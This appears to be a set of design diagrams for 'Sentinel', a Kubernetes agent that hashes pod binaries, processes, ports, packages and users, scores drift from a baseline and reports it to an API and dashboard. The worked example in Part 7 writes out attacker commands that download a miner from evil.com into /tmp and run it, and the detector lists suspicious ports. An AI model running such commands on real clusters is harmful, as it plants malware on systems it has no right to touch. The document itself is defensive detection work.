# SENTINEL CODE FLOW DIAGRAMS

## ══════════════════════════════════════════════════════════════════════════════
## PART 1: ENTROPY AGENT CODE FLOW
## ══════════════════════════════════════════════════════════════════════════════

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                              AGENT STARTUP                                      │
│                              main.go                                            │
└─────────────────────────────────────────────────────────────────────────────────┘
                                      │
                                      ▼
┌─────────────────────────────────────────────────────────────────────────────────┐
│  main()                                                                         │
│  ├── NewAgent()                                                                 │
│  │   ├── getKubeClient()         → Connect to K8s API (in-cluster or kubeconfig)│
│  │   ├── Read environment vars   → NODE_NAME, API_ENDPOINT, SCAN_INTERVAL       │
│  │   ├── monitor.NewMonitor()    → Create drift monitor                         │
│  │   ├── scoring.NewCalculator() → Create score calculator                      │
│  │   ├── reporter.NewReporter()  → Create API reporter                          │
│  │   └── baseline.NewCapturer()  → Create baseline capturer with execFunc       │
│  │                                                                              │
│  └── agent.Run(ctx)              → Start main loop                              │
└─────────────────────────────────────────────────────────────────────────────────┘
                                      │
                                      ▼
┌─────────────────────────────────────────────────────────────────────────────────┐
│  Run(ctx)                                                                       │
│  ├── go watchPods(ctx)           → Start pod watcher goroutine                  │
│  ├── scanAllPods(ctx)            → Initial scan                                 │
│  └── for { ticker.C }            → Every SCAN_INTERVAL seconds                  │
│          └── scanAllPods(ctx)                                                   │
└─────────────────────────────────────────────────────────────────────────────────┘
                                      │
                    ┌─────────────────┴─────────────────┐
                    ▼                                   ▼
┌───────────────────────────────────┐   ┌───────────────────────────────────────┐
│  watchPods(ctx)                   │   │  scanAllPods(ctx)                     │
│  └── for each namespace:          │   │  └── for each namespace:              │
│      └── watchNamespace(ctx, ns)  │   │      └── List pods with label         │
│          └── Watch K8s API        │   │          sentinel.io/monitored=true   │
│              ├── ADDED → handle   │   │          └── for each pod:            │
│              ├── MODIFIED → handle│   │              └── scanPod(ctx, pod)    │
│              └── DELETED → handle │   │                                       │
└───────────────────────────────────┘   └───────────────────────────────────────┘
                    │                                   │
                    ▼                                   ▼
┌─────────────────────────────────────────────────────────────────────────────────┐
│  Pod Event Handlers                                                             │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│  handlePodAdded(pod)           handlePodModified(pod)       handlePodDeleted()  │
│  ├── Check if baseline exists  ├── Check if running         ├── Remove baseline│
│  └── If not: captureBaseline() └── If no baseline: capture  └── reporter.      │
│                                                                  ReportPodRemoved│
└─────────────────────────────────────────────────────────────────────────────────┘
                                      │
                                      ▼
┌─────────────────────────────────────────────────────────────────────────────────┐
│  captureBaseline(pod)                                                           │
│  pkg/baseline/baseline.go                                                       │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│  capturer.CaptureBaseline(namespace, pod, container, podUID)                    │
│  │                                                                              │
│  ├── captureFilesystem()                                                        │
│  │   ├── execFunc("find /bin -type f -executable | xargs sha256sum")            │
│  │   ├── execFunc("find /usr/bin -type f -executable | xargs sha256sum")        │
│  │   ├── execFunc("sha256sum /etc/passwd /etc/shadow ...")                      │
│  │   └── execFunc("find /tmp -type f")                                          │
│  │   └── Returns: FilesystemState { ExecutableHashes, ConfigHashes, TmpFiles }  │
│  │                                                                              │
│  ├── captureProcesses()                                                         │
│  │   └── execFunc("ps aux")                                                     │
│  │   └── Returns: ProcessState { []ProcessInfo{PID, User, Command, Args} }      │
│  │                                                                              │
│  ├── captureNetwork()                                                           │
│  │   └── execFunc("ss -tlnp || netstat -tlnp")                                  │
│  │   └── Returns: NetworkState { []PortInfo{Port, Protocol, Process} }          │
│  │                                                                              │
│  ├── capturePackages()                                                          │
│  │   └── execFunc("apk list || dpkg --get-selections || rpm -qa")               │
│  │   └── Returns: PackageState { []string packages }                            │
│  │                                                                              │
│  └── capturePermissions()                                                       │
│      └── execFunc("cat /etc/passwd | cut -d: -f1")                              │
│      └── execFunc("cat /etc/group | cut -d: -f1")                               │
│      └── Returns: PermissionsState { Users, Groups }                            │
│                                                                                 │
│  └── Returns: *Snapshot { PodName, PodUID, Namespace, Container, CapturedAt,    │
│                           Filesystem, Processes, Network, Packages, Permissions }│
└─────────────────────────────────────────────────────────────────────────────────┘
                                      │
                                      ▼
┌─────────────────────────────────────────────────────────────────────────────────┐
│  reporter.ReportBaseline(snapshot)                                              │
│  pkg/reporter/reporter.go                                                       │
├─────────────────────────────────────────────────────────────────────────────────┤
│  POST http://sentinel-api:8080/api/baselines                                    │
│  Body: { podName, podUID, namespace, container, nodeName, capturedAt, snapshot }│
└─────────────────────────────────────────────────────────────────────────────────┘


## ══════════════════════════════════════════════════════════════════════════════
## PART 2: DRIFT DETECTION FLOW
## ══════════════════════════════════════════════════════════════════════════════

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│  scanPod(pod)  [Called every SCAN_INTERVAL]                                     │
│  main.go                                                                        │
└─────────────────────────────────────────────────────────────────────────────────┘
                                      │
                                      ▼
┌─────────────────────────────────────────────────────────────────────────────────┐
│  1. Get stored baseline from memory                                             │
│     baselines[podUID] → *baseline.Snapshot                                      │
│                                                                                 │
│  2. Capture CURRENT state (same as baseline capture)                            │
│     current := capturer.CaptureBaseline(...)                                    │
│                                                                                 │
│  3. Compare baseline vs current                                                 │
│     report := monitor.Compare(baseline, current)                                │
└─────────────────────────────────────────────────────────────────────────────────┘
                                      │
                                      ▼
┌─────────────────────────────────────────────────────────────────────────────────┐
│  monitor.Compare(base, current)                                                 │
│  pkg/monitor/monitor.go                                                         │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│  ┌─────────────────────────────────────────────────────────────────────────┐    │
│  │ compareFilesystem(base, current)                                        │    │
│  │ ├── For each executable in current:                                     │    │
│  │ │   ├── Not in base? → DriftEvent{category:"filesystem",                │    │
│  │ │   │                              eventType:"new_executable",          │    │
│  │ │   │                              severity:"high"}                     │    │
│  │ │   └── Hash changed? → DriftEvent{eventType:"modified_system_binary",  │    │
│  │ │                                  severity:"critical"}                 │    │
│  │ ├── For each config file:                                               │    │
│  │ │   └── Hash changed? → DriftEvent{eventType:"config_modified"}         │    │
│  │ └── For each file in /tmp:                                              │    │
│  │     └── New file? → DriftEvent{eventType:"new_tmp_file"}                │    │
│  └─────────────────────────────────────────────────────────────────────────┘    │
│                                                                                 │
│  ┌─────────────────────────────────────────────────────────────────────────┐    │
│  │ compareProcesses(base, current)                                         │    │
│  │ └── For each process in current:                                        │    │
│  │     └── Not in base? → Check if suspicious:                             │    │
│  │         ├── isCryptoMiner()? → severity:"critical", "crypto_mining"     │    │
│  │         ├── isSuspiciousProcess()? → severity:"critical"                │    │
│  │         └── Normal → severity:"medium", "new_process"                   │    │
│  └─────────────────────────────────────────────────────────────────────────┘    │
│                                                                                 │
│  ┌─────────────────────────────────────────────────────────────────────────┐    │
│  │ compareNetwork(base, current)                                           │    │
│  │ └── For each listening port in current:                                 │    │
│  │     └── Not in base? → DriftEvent{eventType:"new_listening_port"}       │    │
│  │         └── isSuspiciousPort(4444,5555,6666)? → severity:"high"         │    │
│  └─────────────────────────────────────────────────────────────────────────┘    │
│                                                                                 │
│  ┌─────────────────────────────────────────────────────────────────────────┐    │
│  │ comparePackages(base, current)                                          │    │
│  │ └── For each package in current:                                        │    │
│  │     └── Not in base? → DriftEvent{eventType:"new_package",              │    │
│  │                                   severity:"medium"}                    │    │
│  └─────────────────────────────────────────────────────────────────────────┘    │
│                                                                                 │
│  ┌─────────────────────────────────────────────────────────────────────────┐    │
│  │ comparePermissions(base, current)                                       │    │
│  │ ├── New user? → DriftEvent{eventType:"new_user", severity:"critical"}   │    │
│  │ └── New group? → DriftEvent{eventType:"new_group", severity:"high"}     │    │
│  └─────────────────────────────────────────────────────────────────────────┘    │
│                                                                                 │
│  Returns: *DriftReport { PodName, Events[]DriftEvent, TotalEvents }             │
└─────────────────────────────────────────────────────────────────────────────────┘
                                      │
                                      ▼
┌─────────────────────────────────────────────────────────────────────────────────┐
│  calculator.Calculate(report)                                                   │
│  pkg/scoring/scoring.go                                                         │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│  WEIGHTS (from Blueprint):                                                      │
│  ┌─────────────────────────────────────────────────────────────────────────┐    │
│  │  Filesystem:  0.35  │  Processes: 0.30  │  Network: 0.20                │    │
│  │  Packages:    0.10  │  Permissions: 0.05                                │    │
│  └─────────────────────────────────────────────────────────────────────────┘    │
│                                                                                 │
│  SEVERITY POINTS:                                                               │
│  ┌─────────────────────────────────────────────────────────────────────────┐    │
│  │  new_executable: 15        │  modified_system_binary: 25                │    │
│  │  new_tmp_file: 10          │  config_modified: 5                        │    │
│  │  new_process: 10           │  crypto_mining_signature: 50               │    │
│  │  new_listening_port: 20    │  new_package: 15                           │    │
│  │  new_user: 30              │  new_group: 15                             │    │
│  └─────────────────────────────────────────────────────────────────────────┘    │
│                                                                                 │
│  CALCULATION:                                                                   │
│  ┌─────────────────────────────────────────────────────────────────────────┐    │
│  │  For each event:                                                        │    │
│  │    categoryScores[category].RawScore += getEventPoints(eventType)       │    │
│  │                                                                         │    │
│  │  For each category:                                                     │    │
│  │    cappedScore = min(100, rawScore)                                     │    │
│  │    penalty = weight × cappedScore                                       │    │
│  │    totalPenalty += penalty                                              │    │
│  │                                                                         │    │
│  │  FINAL_SCORE = 100 - totalPenalty                                       │    │
│  └─────────────────────────────────────────────────────────────────────────┘    │
│                                                                                 │
│  Returns: ScoreResult { FinalScore, CategoryScores, TotalPenalty, EventCount }  │
└─────────────────────────────────────────────────────────────────────────────────┘
                                      │
                                      ▼
┌─────────────────────────────────────────────────────────────────────────────────┐
│  reporter.ReportDrift(report, scoreResult)                                      │
│  pkg/reporter/reporter.go                                                       │
├─────────────────────────────────────────────────────────────────────────────────┤
│  POST http://sentinel-api:8080/api/drift                                        │
│  Body: { podName, podUID, namespace, score, status, scoreResult, events[] }     │
└─────────────────────────────────────────────────────────────────────────────────┘


## ══════════════════════════════════════════════════════════════════════════════
## PART 3: API SERVER CODE FLOW
## ══════════════════════════════════════════════════════════════════════════════

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                              API STARTUP                                        │
│                              main.go                                            │
└─────────────────────────────────────────────────────────────────────────────────┘
                                      │
                                      ▼
┌─────────────────────────────────────────────────────────────────────────────────┐
│  main()                                                                         │
│  ├── Read environment: API_PORT, DB_PATH, EVENT_RETENTION_HOURS                 │
│  ├── store.NewStore(dbPath)      → Initialize SQLite, create tables             │
│  ├── websocket.NewHub()          → Create WebSocket hub                         │
│  ├── go wsHub.Run()              → Start hub goroutine                          │
│  ├── handlers.NewHandler(store, hub)                                            │
│  ├── Create Fiber app with middleware (logger, cors, recover)                   │
│  ├── handler.RegisterRoutes(app)                                                │
│  ├── Setup WebSocket endpoint: /api/ws/scores                                   │
│  ├── go cleanup goroutine        → Delete old data hourly                       │
│  └── app.Listen(":8080")                                                        │
└─────────────────────────────────────────────────────────────────────────────────┘
                                      │
                                      ▼
┌─────────────────────────────────────────────────────────────────────────────────┐
│  SQLite Schema (store/store.go - initialize())                                  │
├─────────────────────────────────────────────────────────────────────────────────┤
│  ┌─────────────┐  ┌─────────────┐  ┌──────────────┐  ┌─────────────────┐        │
│  │    pods     │  │  baselines  │  │ drift_events │  │  score_history  │        │
│  ├─────────────┤  ├─────────────┤  ├──────────────┤  ├─────────────────┤        │
│  │ id          │  │ id          │  │ id           │  │ id              │        │
│  │ name        │  │ pod_uid  ───┼──│ pod_uid      │  │ pod_uid         │        │
│  │ uid ────────┼──│ pod_name    │  │ pod_name     │  │ pod_name        │        │
│  │ namespace   │  │ namespace   │  │ namespace    │  │ namespace       │        │
│  │ node_name   │  │ container   │  │ container    │  │ score           │        │
│  │ status      │  │ node_name   │  │ timestamp    │  │ status          │        │
│  │ score       │  │ captured_at │  │ category     │  │ timestamp       │        │
│  │ last_seen   │  │ snapshot    │  │ severity     │  │ breakdown (JSON)│        │
│  │ created_at  │  │   (JSON)    │  │ event_type   │  │                 │        │
│  └─────────────┘  └─────────────┘  │ description  │  └─────────────────┘        │
│                                    │ details      │                             │
│  ┌──────────────┐  ┌────────────┐  └──────────────┘                             │
│  │  purge_log   │  │   config   │                                               │
│  ├──────────────┤  ├────────────┤  ┌───────────────────┐                        │
│  │ id           │  │ key        │  │ agent_heartbeats  │                        │
│  │ pod_uid      │  │ value      │  ├───────────────────┤                        │
│  │ pod_name     │  └────────────┘  │ node_name (PK)    │                        │
│  │ namespace    │                  │ last_heartbeat    │                        │
│  │ purged_at    │                  │ status            │                        │
│  │ reason       │                  └───────────────────┘                        │
│  │ final_score  │                                                               │
│  └──────────────┘                                                               │
└─────────────────────────────────────────────────────────────────────────────────┘


## ══════════════════════════════════════════════════════════════════════════════
## PART 4: API REQUEST HANDLING FLOWS
## ══════════════════════════════════════════════════════════════════════════════

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│  AGENT → API: POST /api/baselines                                               │
│  handlers/handlers.go - ReceiveBaseline()                                       │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│  Request Body:                                                                  │
│  {                                                                              │
│    "podName": "nginx-web-abc123",                                               │
│    "podUID": "uid-xxx-yyy",                                                     │
│    "namespace": "demo-app",                                                     │
│    "container": "nginx",                                                        │
│    "nodeName": "minikube",                                                      │
│    "capturedAt": "2024-01-15T10:00:00Z",                                        │
│    "snapshot": { filesystem, processes, network, packages, permissions }        │
│  }                                                                              │
│                                                                                 │
│  Flow:                                                                          │
│  ┌─────────────────────────────────────────────────────────────────────────┐    │
│  │  1. Parse request body                                                  │    │
│  │  2. store.UpsertPod() → Create/update pod with score=100, status=healthy│    │
│  │  3. store.SaveBaseline() → Store snapshot as JSON                       │    │
│  │  4. hub.Broadcast() → WebSocket: { type: "pod_added", payload: {...} }  │    │
│  │  5. Return: { success: true, message: "Baseline saved" }                │    │
│  └─────────────────────────────────────────────────────────────────────────┘    │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────────────┐
│  AGENT → API: POST /api/drift                                                   │
│  handlers/handlers.go - ReceiveDrift()                                          │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│  Request Body:                                                                  │
│  {                                                                              │
│    "podName": "nginx-web-abc123",                                               │
│    "podUID": "uid-xxx-yyy",                                                     │
│    "namespace": "demo-app",                                                     │
│    "score": 65,                                                                 │
│    "status": "warning",                                                         │
│    "scoreResult": { finalScore, categoryScores, ... },                          │
│    "events": [                                                                  │
│      { eventId, category, severity, eventType, description, details }           │
│    ],                                                                           │
│    "totalEvents": 3                                                             │
│  }                                                                              │
│                                                                                 │
│  Flow:                                                                          │
│  ┌─────────────────────────────────────────────────────────────────────────┐    │
│  │  1. Parse request body                                                  │    │
│  │  2. store.UpdatePodScore(uid, 65, "warning")                            │    │
│  │  3. For each event: store.SaveDriftEvent()                              │    │
│  │  4. store.SaveScoreRecord() → Save to score_history                     │    │
│  │  5. hub.Broadcast() → WebSocket: { type: "score_update", ... }          │    │
│  │  6. For each event: hub.Broadcast() → { type: "drift_event", ... }      │    │
│  │  7. Return: { success: true, message: "Drift recorded" }                │    │
│  └─────────────────────────────────────────────────────────────────────────┘    │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────────────┐
│  UI → API: GET /api/leaderboard                                                 │
│  handlers/handlers.go - GetLeaderboard()                                        │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│  Flow:                                                                          │
│  ┌─────────────────────────────────────────────────────────────────────────┐    │
│  │  1. store.GetLeaderboard(limit=50)                                      │    │
│  │     → SELECT name, namespace, score, status, last_seen                  │    │
│  │       FROM pods ORDER BY score ASC LIMIT 50                             │    │
│  │  2. Return: { success: true, data: [ { rank, podName, score, ... } ] }  │    │
│  └─────────────────────────────────────────────────────────────────────────┘    │
│                                                                                 │
│  Response:                                                                      │
│  {                                                                              │
│    "success": true,                                                             │
│    "data": [                                                                    │
│      { "rank": 1, "podName": "nginx-abc", "score": 23, "status": "critical" },  │
│      { "rank": 2, "podName": "nginx-def", "score": 67, "status": "warning" },   │
│      { "rank": 3, "podName": "postgres-0", "score": 99, "status": "healthy" }   │
│    ]                                                                            │
│  }                                                                              │
└─────────────────────────────────────────────────────────────────────────────────┘


## ══════════════════════════════════════════════════════════════════════════════
## PART 5: WEBSOCKET FLOW
## ══════════════════════════════════════════════════════════════════════════════

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│  WebSocket Hub (websocket/websocket.go)                                         │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│  ┌──────────────────────────────────────────────────────────────────────────┐   │
│  │                              Hub                                         │   │
│  │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐                       │   │
│  │  │  register   │  │ unregister  │  │  broadcast  │                       │   │
│  │  │   channel   │  │   channel   │  │   channel   │                       │   │
│  │  └──────┬──────┘  └──────┬──────┘  └──────┬──────┘                       │   │
│  │         │                │                │                              │   │
│  │         ▼                ▼                ▼                              │   │
│  │  ┌─────────────────────────────────────────────────────────────────┐     │   │
│  │  │  Hub.Run() goroutine                                            │     │   │
│  │  │  for select {                                                   │     │   │
│  │  │    case client := <-register:  → clients[client] = true         │     │   │
│  │  │    case client := <-unregister: → delete(clients, client)       │     │   │
│  │  │    case message := <-broadcast: → for client: client.Send       │     │   │
│  │  │  }                                                              │     │   │
│  │  └─────────────────────────────────────────────────────────────────┘     │   │
│  │                                                                          │   │
│  │  clients map:                                                            │   │
│  │  ┌─────────────────────────────────────────────────────────────────┐     │   │
│  │  │  Client1 ──► Conn (browser 1) ──► Send channel                  │     │   │
│  │  │  Client2 ──► Conn (browser 2) ──► Send channel                  │     │   │
│  │  │  Client3 ──► Conn (browser 3) ──► Send channel                  │     │   │
│  │  └─────────────────────────────────────────────────────────────────┘     │   │
│  └──────────────────────────────────────────────────────────────────────────┘   │
│                                                                                 │
│  Message Types:                                                                 │
│  ┌──────────────────┬───────────────────────────────────────────────────────┐   │
│  │  score_update    │  { podUID, podName, namespace, score, status }        │   │
│  │  drift_event     │  { eventId, category, severity, description, ... }    │   │
│  │  pod_added       │  { podUID, podName, namespace }                       │   │
│  │  pod_removed     │  { podUID, podName, namespace }                       │   │
│  │  config_update   │  { autoPurgeEnabled, purgeSpeed, threshold }          │   │
│  └──────────────────┴───────────────────────────────────────────────────────┘   │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘


## ══════════════════════════════════════════════════════════════════════════════
## PART 6: COMPLETE SYSTEM FLOW
## ══════════════════════════════════════════════════════════════════════════════

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                         COMPLETE SYSTEM ARCHITECTURE                            │
└─────────────────────────────────────────────────────────────────────────────────┘

    ┌─────────────────────────────────────────────────────────────────────────┐
    │                           KUBERNETES CLUSTER                            │
    │  ┌───────────────────────────────────────────────────────────────────┐  │
    │  │                    demo-app namespace                              │  │
    │  │  ┌─────────────┐ ┌─────────────┐ ┌─────────────┐ ┌─────────────┐  │  │
    │  │  │ nginx-abc   │ │ nginx-def   │ │ nginx-ghi   │ │ postgres-0  │  │  │
    │  │  │ Score: 95   │ │ Score: 67   │ │ Score: 23   │ │ Score: 99   │  │  │
    │  │  └─────────────┘ └─────────────┘ └─────────────┘ └─────────────┘  │  │
    │  │         │               │               │               │         │  │
    │  │         └───────────────┴───────────────┴───────────────┘         │  │
    │  │                                 │                                  │  │
    │  │                          kubectl exec                             │  │
    │  │                                 │                                  │  │
    │  └─────────────────────────────────┼─────────────────────────────────┘  │
    │                                    │                                    │
    │  ┌─────────────────────────────────┼─────────────────────────────────┐  │
    │  │                    sentinel namespace                             │  │
    │  │                                 │                                  │  │
    │  │  ┌──────────────────────────────┴──────────────────────────────┐  │  │
    │  │  │                    ENTROPY AGENT (DaemonSet)                │  │  │
    │  │  │  ┌──────────────────────────────────────────────────────┐   │  │  │
    │  │  │  │  1. Watch pods with sentinel.io/monitored=true       │   │  │  │
    │  │  │  │  2. On new pod: capture baseline via kubectl exec    │   │  │  │
    │  │  │  │  3. Every 30s: scan all pods, compare vs baseline    │   │  │  │
    │  │  │  │  4. Calculate entropy score                          │   │  │  │
    │  │  │  │  5. Report to API                                    │   │  │  │
    │  │  │  └──────────────────────────────────────────────────────┘   │  │  │
    │  │  └─────────────────────────────┬──────────────────────────────┘  │  │
    │  │                                │                                  │  │
    │  │                     HTTP POST /api/baselines                      │  │
    │  │                     HTTP POST /api/drift                          │  │
    │  │                     HTTP POST /api/scores                         │  │
    │  │                                │                                  │  │
    │  │                                ▼                                  │  │
    │  │  ┌─────────────────────────────────────────────────────────────┐  │  │
    │  │  │                    API SERVER (Deployment)                  │  │  │
    │  │  │  ┌───────────────────────────────────────────────────────┐  │  │  │
    │  │  │  │  Fiber HTTP Server (:8080)                            │  │  │  │
    │  │  │  │  ├── /api/pods, /api/leaderboard, /api/stats          │  │  │  │
    │  │  │  │  ├── /api/baselines, /api/drift (from agent)          │  │  │  │
    │  │  │  │  └── /api/ws/scores (WebSocket)                       │  │  │  │
    │  │  │  └───────────────────────────────────────────────────────┘  │  │  │
    │  │  │  ┌───────────────────────────────────────────────────────┐  │  │  │
    │  │  │  │  SQLite Database (/data/sentinel.db)                  │  │  │  │
    │  │  │  │  └── pods, baselines, drift_events, score_history     │  │  │  │
    │  │  │  └───────────────────────────────────────────────────────┘  │  │  │
    │  │  │  ┌───────────────────────────────────────────────────────┐  │  │  │
    │  │  │  │  WebSocket Hub                                        │  │  │  │
    │  │  │  │  └── Broadcast score_update, drift_event to clients   │  │  │  │
    │  │  │  └───────────────────────────────────────────────────────┘  │  │  │
    │  │  └─────────────────────────────┬───────────────────────────────┘  │  │
    │  │                                │                                  │  │
    │  │                    port-forward / ingress                         │  │
    │  │                                │                                  │  │
    │  └────────────────────────────────┼──────────────────────────────────┘  │
    └────────────────────────────────────┼────────────────────────────────────┘
                                         │
                                         ▼
    ┌─────────────────────────────────────────────────────────────────────────┐
    │                            YOUR BROWSER                                 │
    │  ┌───────────────────────────────────────────────────────────────────┐  │
    │  │  React UI (Phase 5 - Coming Next)                                 │  │
    │  │  ├── GET /api/leaderboard → Display pod rankings                  │  │
    │  │  ├── GET /api/pods/:id → Show pod details                         │  │
    │  │  ├── WebSocket /api/ws/scores → Real-time score updates           │  │
    │  │  └── PUT /api/config → Update purge settings                      │  │
    │  └───────────────────────────────────────────────────────────────────┘  │
    └─────────────────────────────────────────────────────────────────────────┘
```


## ══════════════════════════════════════════════════════════════════════════════
## PART 7: SCORING EXAMPLE WALKTHROUGH
## ══════════════════════════════════════════════════════════════════════════════

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│  EXAMPLE: Pod "nginx-abc" gets compromised                                      │
└─────────────────────────────────────────────────────────────────────────────────┘

  BASELINE (captured at pod start):
  ┌─────────────────────────────────────────────────────────────────────────────┐
  │  Filesystem: { "/bin/sh": "abc123...", "/usr/bin/nginx": "def456..." }      │
  │  Processes:  [ { cmd: "nginx", pid: 1 }, { cmd: "nginx", pid: 10 } ]        │
  │  Network:    [ { port: "80", protocol: "tcp" } ]                            │
  │  Packages:   [ "nginx", "libc", "openssl" ]                                 │
  │  Users:      [ "root", "nginx" ]                                            │
  └─────────────────────────────────────────────────────────────────────────────┘

  ATTACKER ACTIONS:
  ┌─────────────────────────────────────────────────────────────────────────────┐
  │  1. kubectl exec nginx-abc -- apt-get install curl     (installs package)   │
  │  2. kubectl exec nginx-abc -- curl http://evil.com/miner > /tmp/miner       │
  │  3. kubectl exec nginx-abc -- chmod +x /tmp/miner                           │
  │  4. kubectl exec nginx-abc -- /tmp/miner &             (starts process)     │
  │  5. Miner opens port 4444 for pool connection                               │
  └─────────────────────────────────────────────────────────────────────────────┘

  CURRENT STATE (captured during scan):
  ┌─────────────────────────────────────────────────────────────────────────────┐
  │  Filesystem: { ..., "/tmp/miner": "xyz789..." }        ← NEW FILE           │
  │  Processes:  [ ..., { cmd: "/tmp/miner", pid: 99 } ]   ← NEW PROCESS        │
  │  Network:    [ ..., { port: "4444", protocol: "tcp" }] ← NEW PORT           │
  │  Packages:   [ ..., "curl" ]                           ← NEW PACKAGE        │
  │  Users:      [ "root", "nginx" ]                       ← NO CHANGE          │
  └─────────────────────────────────────────────────────────────────────────────┘

  DRIFT EVENTS DETECTED:
  ┌─────────────────────────────────────────────────────────────────────────────┐
  │  1. { category: "filesystem",  eventType: "new_tmp_file",       pts: 10 }   │
  │  2. { category: "processes",   eventType: "crypto_mining",      pts: 50 }   │
  │  3. { category: "network",     eventType: "new_listening_port", pts: 20 }   │
  │  4. { category: "packages",    eventType: "new_package",        pts: 15 }   │
  └─────────────────────────────────────────────────────────────────────────────┘

  SCORE CALCULATION:
  ┌─────────────────────────────────────────────────────────────────────────────┐
  │  Category      │ Raw Score │ Capped │ Weight │ Penalty                      │
  │  ──────────────┼───────────┼────────┼────────┼──────────                    │
  │  Filesystem    │    10     │   10   │  0.35  │  10 × 0.35 = 3.5             │
  │  Processes     │    50     │   50   │  0.30  │  50 × 0.30 = 15.0            │
  │  Network       │    20     │   20   │  0.20  │  20 × 0.20 = 4.0             │
  │  Packages      │    15     │   15   │  0.10  │  15 × 0.10 = 1.5             │
  │  Permissions   │     0     │    0   │  0.05  │   0 × 0.05 = 0.0             │
  │  ──────────────┴───────────┴────────┴────────┴──────────                    │
  │  Total Penalty: 3.5 + 15.0 + 4.0 + 1.5 + 0.0 = 24.0                         │
  │                                                                             │
  │  FINAL SCORE = 100 - 24 = 76                                                │
  │  STATUS = "warning" (50-89)                                                 │
  └─────────────────────────────────────────────────────────────────────────────┘

  RESULT SENT TO API:
  ┌─────────────────────────────────────────────────────────────────────────────┐
  │  POST /api/drift                                                            │
  │  {                                                                          │
  │    "podName": "nginx-abc",                                                  │
  │    "score": 76,                                                             │
  │    "status": "warning",                                                     │
  │    "events": [ ... 4 events ... ]                                           │
  │  }                                                                          │
  └─────────────────────────────────────────────────────────────────────────────┘

  UI RECEIVES VIA WEBSOCKET:
  ┌─────────────────────────────────────────────────────────────────────────────┐
  │  { "type": "score_update", "payload": { "podName": "nginx-abc", "score": 76 }│
  │  { "type": "drift_event", "payload": { "eventType": "crypto_mining", ... }  │
  └─────────────────────────────────────────────────────────────────────────────┘
```
